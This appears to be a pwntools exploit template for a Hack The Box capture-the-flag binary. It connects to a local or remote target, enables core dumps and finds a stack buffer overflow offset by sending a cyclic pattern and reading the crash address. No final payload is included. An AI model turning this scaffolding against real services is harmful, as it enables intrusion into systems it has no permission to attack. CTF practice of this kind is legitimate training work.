#!/usr/bin/python3
from pwn import *


## Change filename and local
filename = './vuln'
remote_url = 'docker.hackthebox.eu'
remote_port = 31195
local = False


#this line enabels pwntools to overwrite core files
if os.path.exists('core'): os.unlink('core')

##Setup context
#enable coredumps
os.system('ulimit -c unlimited')#TODO:find command the enables coredumps on all systems
context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']# Sets the terminal to be opened if gdb is used
elf = context.binary = ELF(filename)
#This creates a packer and unpacker for the correponding architecture e.g p64() for x64 ans p32() for i386
p = make_packer()
u = make_unpacker()

def getP(local=local):
    return process(filename) if local else remote(remote_url, remote_port)

##Find offset for bufoverflow
def findOffset(process):
    payload = cyclic(1000)
    process.sendline(payload)
    process.wait()
    core = process.corefile
    if context.arch == 'amd64':
        stack = core.rsp
        pattern = core.read(stack, 4)
        offset = cyclic_find(pattern)
    elif context.arch == 'i386':
        # Our cyclic pattern should have been used as the crashing address
        assert pack(core.eip) in payload
        offset = cyclic_find(core.eip)
    else:
        error('The architecture %s is currently not supported', context.arch)
    return offset
